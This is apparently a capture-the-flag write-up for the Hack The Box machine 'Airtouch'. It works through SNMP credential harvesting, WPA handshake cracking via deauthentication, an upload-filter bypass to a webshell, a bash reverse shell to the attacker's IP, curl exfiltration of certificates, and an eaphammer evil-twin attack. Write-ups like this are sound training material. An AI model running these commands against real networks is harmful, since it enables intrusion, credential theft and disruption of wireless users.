# Airtouch

**Target IP:** `10.129.244.98`     
**Hostname:** `airtouch.htb`     
**Platform:** `Linux`     
**Difficulty:** `Medium`    

---

## 1. Reconnaissance
Before doing anything, based on the name of the box and the image, I am assuming this might be related to WiFi, due to a tool named `aircrack-ng`.

### 1.1 Port Scan

```
PORT     STATE SERVICE
22/tcp   open  ssh
```

I initially did a quick TCP port scan, but only found port 22 open. Doing a larger scan returned nothing more.

### 1.2 SSH Fingerprinting

Given we have no further open ports than ssh, I decide to perform some basic enumeration and discover it is running `SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11`: ![Pasted image 20260416095541.png](Screenshots/Pasted%20image%2020260416095541.png)

I search around but can't find any obvious vulnerabilities for this version.

### 1.3 UDP Scan

```
PORT     STATE SERVICE
68/udp   open  dhcpc
161/udp  open  snmp
```

After I had finished by SSH recon, my UDP scan had finished, finding 2 ports. The SNMP is of most interest as this is often misconfigured and can often be accessed easily.

### 1.4 SNMP Credential Harvesting

Performing a simple scan on the SNMP service returns a potential username and password: ![Pasted image 20260416101104](Screenshots/Pasted%20image%2020260416101104.png)

`admin`:`RxBlZhLmOkacNWScmZ6D`

I try this for SSH but it doesn't work. However, changing the username to `consultant` does, and we get a shell: ![Pasted image 20260416101842](Screenshots/Pasted%20image%2020260416101842.png)

---

## 2. Jump Box Enumeration

### 2.1 Home Directory & Sudo Access

Now that we are on the box I start to perform some simple enumeration and find the following files in the home directory: ![Pasted image 20260416102011](Screenshots/Pasted%20image%2020260416102011.png)

I also discover that we can run anything as `sudo`, but I find no flags, suggesting this is not the target box and rather a jump box: ![Pasted image 20260416102246](Screenshots/Pasted%20image%2020260416102246.png)

To get the files off the box, I spin up my own upload server:

```bash
python3 -m uploadserver 443 --server-certificate ~/Documents/server.pem
```

Then I send them to our server:

```bash
curl -X POST https://10.10.14.2/upload -F 'files=@/home/consultant/diagram-net.png' -F 'files=@/home/consultant/photo_2023-03-01_22-04-52.png' --insecure
```

### 2.2 Network Diagram Analysis

The first `diagram-net.png` seems to show how the vlans are connected, with direct connection to consultant (which is what we have now) and then 2 vlans with access points, which I guess we need to target: ![Pasted image 20260416102919](Screenshots/Pasted%20image%2020260416102919.png)

The other image is a similar diagram but hand drawn: ![Pasted image 20260416102957](Screenshots/Pasted%20image%2020260416102957.png)

### 2.3 Root Folder Investigation

As we can `sudo su` I decide the root folder might be interesting to look at as well. In here I find a folder named `eaphammer`. Researching online, this appears to be a tool to perform evil twin attacks: ![Pasted image 20260416103241](Screenshots/Pasted%20image%2020260416103241.png)

---

## 3. WPA Cracking on AirTouch-Internet

Before doing this, I first went down a bit of a rabbit hole, based on the tool `eaphammer`, however later discovered this is used later on in the box. For brevity I have removed my ramblings that turned out to be irrelevant. 
### 3.1 Enabling Monitor Mode

Based on the diagram I suspect the way forward is to exploit the `AirTouch-Internet` AP in order to gain access.

We will need to run one of the interfaces in monitor mode:

```bash
sudo airmon-ng start wlan0
```

### 3.2 Access Point Discovery

To run the next step, we need some information (e.g. SSID and channel) we can get this by running:

```bash
sudo airodump-ng wlan0mon
```

![Pasted image 20260416104848](Screenshots/Pasted%20image%2020260416104848.png)

This gives the SSID as `AirTouch-Internet` and the channel as 6. Now we can start our listener:

```bash
sudo airodump-ng wlan0mon -w HTB -c 6
```

![Pasted image 20260416144722](Screenshots/Pasted%20image%2020260416144722.png)

### 3.3 Client Identification & Deauthentication

Then in a seperate SSH window, I see which MAC addresses I could potentially deauth in order to get them to auth back:

```bash
sudo airodump-ng --bssid F0:9F:C2:A3:F1:A7 --channel 6 wlan0mon
```

![Pasted image 20260416110351](Screenshots/Pasted%20image%2020260416110351.png)

Force the interface to the correct channel:

```bash
sudo iwconfig wlan0mon channel 6 
```

Now we can deauth this MAC address like so:

```bash
sudo aireplay-ng --deauth 5 -a F0:9F:C2:A3:F1:A7 -c 28:6C:07:FE:A3:22 wlan0mon
```

This will force this device which is connected to the AP to drop the connection. If it is enabled to automatically reconnect (which most devices are), it will reconnect and go through the WPA authentication process, which we can intercept.
### 3.4 Handshake Capture & WPA Cracking

Back on our other shell, we can kill the listener and upload the collected cap file to out host:

```bash
curl -X POST https://10.10.14.2/upload -F 'files=@/root/eaphammer/HTB-01.cap' --insecure
```

Then we can crack this file like so:

```bash
aircrack-ng HTB-01.cap -w /usr/share/wordlists/rockyou.txt
```

![Pasted image 20260416144849](Screenshots/Pasted%20image%2020260416144849.png)

We have found that the AP AirTouch-Internet's password is `challenge`.

### 3.5 Connecting to AirTouch-Internet

We can attempt to connect to this AP and see if we can find any interesting services etc.

Create a password file:

```bash
wpa_passphrase "AirTouch-Internet" challenge > /tmp/wpa.conf
```

Use password for unused wlan3:

```bash
sudo wpa_supplicant -B -i wlan3 -c /tmp/wpa.conf
```

Enable:

```bash
sudo dhclient wlan3
```

Check wlan3 has the correct ip range:

```bash
ip addr show wlan3
```

![Pasted image 20260416145724](Screenshots/Pasted%20image%2020260416145724.png)

### 3.6 Tunnelling with Ligolo

To tunnel I'm going to use ligolo.

On attacker box:

```bash
sudo ./proxy -selfcert -laddr 0.0.0.0:11601 
```

Target:

```bash
./agent -connect 10.10.14.2:11601 -ignore-cert
```

I then autoroute and select the `192.168.3.46/24` ip range: ![Pasted image 20260416150128](Screenshots/Pasted%20image%2020260416150128.png)

### 3.7 Internal Network Pivoting

With the new access, I performed an nmap scan, looking for some key ports, and noticed a http service open on `192.168.3.1`: ![Pasted image 20260416150325](Screenshots/Pasted%20image%2020260416150325.png)

---

## 4. Router Web Application Exploitation

### 4.1 Router Login Page Fingerprinting

Now that we have identified a HTTP service running on `192.168.3.1` we can visit this in the browser to view: ![Pasted image 20260416150533](Screenshots/Pasted%20image%2020260416150533.png)

It appears to be a very simply looking router login screen. I also note that the site is running PHP.

Viewing a 404 page, it leaks this is Apache and Ubuntu: ![Pasted image 20260416150628](Screenshots/Pasted%20image%2020260416150628.png)

I try some of the credentials collected, but I think this is potentially a dead end.

### 4.2 Wireless Traffic Capture for Credential Interception

With some thinking I devise a plan. The page is http and is not secured, therefore if we monitor the network and someone logs in, we can capture the raw credentials.

```bash
sudo airodump-ng wlan0mon -w capture --output-format pcap --channel 6
```

Then I once again send deauth packets:

```bash
sudo aireplay-ng --deauth 5 -a F0:9F:C2:A3:F1:A7 -c 28:6C:07:FE:A3:22 wlan0mon
```

### 4.3 PCAP Decryption & Session Cookie Extraction

Then I transfer this to my attacker box, and open it in wireshark, then decrypt the traffic using the password like so: ![Pasted image 20260416155038](Screenshots/Pasted%20image%2020260416155038.png)

Then when filtering the tcp stream of the decoded data, we see a request to `/lab.php` with a session cookie: ![Pasted image 20260416155118](Screenshots/Pasted%20image%2020260416155118.png)

Using this cookie we now see a different screen: ![Pasted image 20260417100706](Screenshots/Pasted%20image%2020260417100706.png)

The password is properly masked.

### 4.4 Client-Side Role Bypass

Looking in the burp traffic, I see there is a cookie named UserRole, we might be able to exploit this to get some client side auth bypass: ![Pasted image 20260417100851](Screenshots/Pasted%20image%2020260417100851.png)

I modify the role to be `admin` and notice in the response I have a new section now for uploading files: ![Pasted image 20260417101033](Screenshots/Pasted%20image%2020260417101033.png)

### 4.5 File Upload Filter Bypass & Webshell

I attempt to upload a webshell but get an error stating PHP and HTML are not allowed, this gives me the idea that they are likely using a blacklist rather than a whitelist, so I try some php bypass extensions. I try several from the OWASP list, eventually finding that `.phtml` is allowed and allows command execution: ![Pasted image 20260417101520](Screenshots/Pasted%20image%2020260417101520.png)

I then spin up a penelope listener and attempt to fire off the following reverse shell. However, this or other variations of a reverse shell don't seem to work, perhaps due to some firewall:

```bash
/bin/sh -c '/bin/sh -i >& /dev/tcp/10.10.14.2/4444 0>&1'
```

### 4.6 Credential Discovery & SSH Access

I could try more variations and different ports to be more evasive, but with my webshell I was able to find some credentials instead: ![Pasted image 20260417102355](Screenshots/Pasted%20image%2020260417102355.png)

On the host, ssh is open so I will try these here: ![Pasted image 20260417102430](Screenshots/Pasted%20image%2020260417102430.png)

And we can login as `user`:`JunDRDZKHDnpkpDDvay`. Similarly to before, we can quickly escalate to root: ![Pasted image 20260417102622](Screenshots/Pasted%20image%2020260417102622.png)

In `/root` there are various files, including the user flag: ![Pasted image 20260417102708](Screenshots/Pasted%20image%2020260417102708.png)

---

## 5. Privilege Escalation

### 5.1 Root Directory Enumeration

As mentioned earlier, in `/root` there are various files. One of interest is `send_certs.sh`, which contains some credentials:

```bash
#!/bin/bash

# DO NOT COPY
# Script to sync certs-backup folder to AirTouch-office. 

# Define variables
REMOTE_USER="remote"
REMOTE_PASSWORD="xGgWEwqUpfoOVsLeROeG"
REMOTE_PATH="~/certs-backup/"
LOCAL_FOLDER="/root/certs-backup/"

# Use sshpass to send the folder via SCP
sshpass -p "$REMOTE_PASSWORD" scp -r "$LOCAL_FOLDER" "$REMOTE_USER@10.10.10.1:$REMOTE_PATH"
```

These will likely be useful, however as of current, we have no connectivity to `10.10.10.1`.

`start.sh` is also somewhat interesting:

```bash
#!/bin/bash

echo start.sh

# TODO move to Dockerfile
envsubst_tmp (){
    for F in ./*.tmp ; do
        #DO it only first time
        if [ "$F" != '/*.tmp' ]; then 
            #echo $F
            NEW=`basename $F .tmp`
            envsubst < $F > $NEW
            rm $F 2> /dev/nil
        fi
    done
}

chown user:user /home/user/user.txt
chmod +r /var/www/certs/ -R

#LOAD VARIABLES FROM FILE (EXPORT)
set -a
source /root/wlan_config_aps

envsubst < /etc/dnsmasq.conf.tmp > /etc/dnsmasq.conf

# Replace var in config AP files
#PSK
cd /root/psk/
envsubst_tmp

cd

date

echo 'nameserver 8.8.8.8' > /etc/resolv.conf

# Wlan first 6 for attacker, next 14 for AP, rest for client

mkdir /var/log/ 2> /dev/nil

#F0:9F:C2:71 ubiquiti
macchanger -m $MAC_PSK $WLAN_PSK >> /var/log/macchanger.log # PSK

macchanger -r $WLAN_OTHER0  >> /var/log/macchanger.log # Other 0
macchanger -r $WLAN_OTHER1 >> /var/log/macchanger.log # Other 1
macchanger -r $WLAN_OTHER2 >> /var/log/macchanger.log # Other 2
macchanger -r $WLAN_OTHER3 >> /var/log/macchanger.log # Other 3


bash /root/cronAPs.sh > /var/log/cronAPs.log 2>&1 &

dnsmasq

#TODO RE ORDER ALL WLAN and IP -> 0 OPN, 1 WEP, 2 PSK, 3 PSK WPS, 4 MGT, 5 MGTRelay, 6 MGT TLS, 7 8 , 9,10,11,12,13 others

# PSK
ip addr add $IP_PSK.1/24 dev $WLAN_PSK
hostapd_aps /root/psk/hostapd_wpa.conf > /var/log/hostapd_wpa.log &

#TODO
#ip addr add $IP_8.1/24 dev $WLAN_MGTTLS

# PSK Other
ip addr add $IP_OTHER0.1/24 dev $WLAN_OTHER0
hostapd_aps /root/psk/hostapd_other0.conf > /var/log/hostapd_other0.log & 

ip addr add $IP_OTHER1.1/24 dev $WLAN_OTHER1
hostapd_aps /root/psk/hostapd_other1.conf > /var/log/hostapd_other1.log & 

ip addr add $IP_OTHER2.1/24 dev $WLAN_OTHER2
hostapd_aps /root/psk/hostapd_other2.conf > /var/log/hostapd_other2.log & 

ip addr add $IP_OTHER3.1/24 dev $WLAN_OTHER3
hostapd_aps /root/psk/hostapd_other3.conf > /var/log/hostapd_other3.log & 

#systemctl stop networking
echo "ALL SET"

/bin/bash
```

This appears to be a setup script for the box, not super useful but does give us insight that we probably need to exploit another wifi network.

In `root/certs-backup` we have various certificate files which may be useful.

### 5.2 Evil Twin Attack on AirTouch-Office

#### 5.2.1 Certificate Exfiltration

At this point I think we can likely use the certs found in `/root/cert-backup` on the host with `eaphammer` to create a fake `AirTouch-Office` SSID, deauth a user and then get some access using this.

To do this we first need to exfiltrate the server.crt, server.key and ca.crt. I create a small python script on the Consultant box:

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import os

class UploadHandler(BaseHTTPRequestHandler):
    def do_PUT(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length)
        filename = os.path.basename(self.path)
        with open(filename, 'ab') as f:
            f.write(data)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

HTTPServer(('0.0.0.0', 8080), UploadHandler).serve_forever()
```

Upload:

```bash
curl -X PUT http://192.168.3.46:8080/server.crt --data-binary @/root/certs-backup/server.crt
```

```bash
curl -X PUT http://192.168.3.46:8080/server.key --data-binary @/root/certs-backup/server.key
```

```bash
curl -X PUT http://192.168.3.46:8080/ca.crt --data-binary @/root/certs-backup/ca.crt
```

#### 5.2.2 Certificate Import & AP Discovery

Import certs:

```bash
./eaphammer/eaphammer --cert-wizard import --server-cert ./server.crt --ca-cert ./ca.crt --private-key ./server.key
```

To perform an evil twin, we need to know the BSSID of the target so we can impersonate it, remembering earlier that I couldn't find this host, I try to instead scan for _all_ channels:

```bash
sudo airodump-ng --band abg wlan0mon
```

![Pasted image 20260417114335](Screenshots/Pasted%20image%2020260417114335.png) This identifies two `AirTouch-Office` options, both on channel 44.

#### 5.2.3 Evil Twin Launch & Deauthentication

Now we can spin up the Evil-Twin:

```bash
# Basic evil twin with your certs
./eaphammer/eaphammer -i wlan3 --essid "AirTouch-Office" --auth wpa-eap --creds --bssid AC:8B:A9:F3:A1:13 --channel 44
```

This presents an error:

```bash
[!] The hw_mode specified in hostapd.ini is invalid for the selected channel (g, 44)
```

We force our interface to use the correct channel:

```bash
sudo iwconfig wlan0mon channel 44
```

Edit file and change `hw_mode` to `a`

```bash
nano /root/eaphammer/settings/core/hostapd.ini
```

Then we deauth:

```bash
sudo aireplay-ng --deauth 5 -a AC:8B:A9:F3:A1:13 wlan0mon
```

This doesn't work, but I find after changing the BSSID to the second AP find, it does:

```bash
# Basic evil twin with your certs
./eaphammer/eaphammer -i wlan3 --essid "AirTouch-Office" --auth wpa-eap --creds --bssid AC:8B:A9:AA:3F:D2 --channel 44
```

```bash
sudo aireplay-ng --deauth 5 -a AC:8B:A9:AA:3F:D2 wlan0mon
```

#### 5.2.4 EAP Credential Capture & Hash Cracking

Results: ![Pasted image 20260417115137](Screenshots/Pasted%20image%2020260417115137.png)

This outputs a hashcat hash, that we attempt to crack and it drops as `r4ulcl`:`laboratory`: ![Pasted image 20260417115248](Screenshots/Pasted%20image%2020260417115248.png)

### 5.3 Connecting to AirTouch-Office

Now following similar steps to before, we can connect to this wirelessly. First we create an `eap.conf`:

```
network={
    ssid="AirTouch-Office"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="AirTouch\r4ulcl"
    password="laboratory"
}
```

Then we run:

```bash
 wpa_supplicant -i wlan4 -c /root/eap.conf
```

![Pasted image 20260417122620](Screenshots/Pasted%20image%2020260417122620.png)

In a different tab we enable this interface:

```bash
dhclient wlan4
```

Now we can ssh in using the credentials found earlier, noting that this time we can't simply `sudo su`: ![Pasted image 20260417122812](Screenshots/Pasted%20image%2020260417122812.png)

### 5.4 Hostapd Config Discovery & Root Access

I figure that as this is likely used as the AP management (based on the name) there will be a configuration file stored somewhere with the username / password combinations. Searching around i find `/etc/hostapd/hostapd_wpe.eap_user`: ![Pasted image 20260417123433](Screenshots/Pasted%20image%2020260417123433.png)

Which contains a new combination: `admin`:`xMJpzXt4D9ouMuL3JJsMriF7KZozm7`

Logging in as this new user, we can run all sudo commands: ![Pasted image 20260417123517](Screenshots/Pasted%20image%2020260417123517.png)

So we can grab the root flag: ![Pasted image 20260417123549](Screenshots/Pasted%20image%2020260417123549.png)

---

## Summary

|**Step**|**Technique**|
|---|---|
|**Initial Foothold**|SNMP Credential Harvesting & SSH Access|
|**Wireless Pivot (PSK)**|WPA2 Handshake Cracking & Ligolo-ng Tunneling|
|**Web & User Access**|Wireless Traffic Sniffing, Cookie Bypass & .phtml RCE|
|**Wireless Pivot (EAP)**|WPA-EAP Evil Twin Attack & NetNTLMv2 Hash Cracking|
|**Root Escalation**|Hostapd Configuration Analysis & Sudo Access
